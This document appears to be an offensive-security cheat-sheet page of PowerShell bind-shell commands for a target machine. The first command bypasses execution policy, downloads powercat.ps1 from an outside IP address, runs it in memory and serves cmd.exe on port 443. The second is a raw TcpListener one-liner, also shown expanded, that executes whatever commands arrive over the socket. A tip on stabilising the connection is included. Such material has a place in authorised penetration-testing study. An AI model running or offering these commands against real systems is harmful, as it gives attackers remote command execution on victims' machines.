# Powercat \| Powershell

## Powercat

```bash
powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.189/powercat.ps1');powercat -l -p 443 -e cmd.exe"
```

{% hint style="danger" %}
Note it may be necessary to press `Enter` a couple times after the connection is established. Otherwise shell may not be sent successfully.
{% endhint %}

## Powershell \(one liner\)

Use a one liner on the TARGET:

```bash
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

Expanded one liner:

```bash
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close();
$listener.Stop();
```

